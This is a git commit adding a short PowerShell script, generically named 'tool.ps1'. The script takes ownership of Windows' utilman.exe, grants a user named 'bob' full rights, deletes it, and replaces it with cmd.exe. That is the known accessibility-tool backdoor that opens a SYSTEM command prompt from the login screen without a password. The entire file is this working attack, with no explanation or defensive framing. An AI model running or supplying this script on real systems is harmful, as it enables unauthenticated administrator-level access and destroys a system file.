5d3fe7b55dc0897d7526e376fa4175b99cba9adb
marcusforsberg-truesec <marcus.forsberg@truesec.se>
2024-10-09 14:00:08 +0200

    Create tool.ps1

---
+++ tool.ps1
@@ -0,0 +1,13 @@
+# Define the paths
+$utilmanPath = "C:\Windows\System32\utilman.exe"
+$cmdPath = "C:\Windows\System32\cmd.exe"
+
+# Take ownership of utilman.exe
+takeown /f $utilmanPath
+icacls $utilmanPath /grant bob:F
+
+# Remove utilman.exe
+Remove-Item $utilmanPath -Force
+
+# Copy cmd.exe to utilman.exe
+Copy-Item $cmdPath -Destination $utilmanPath
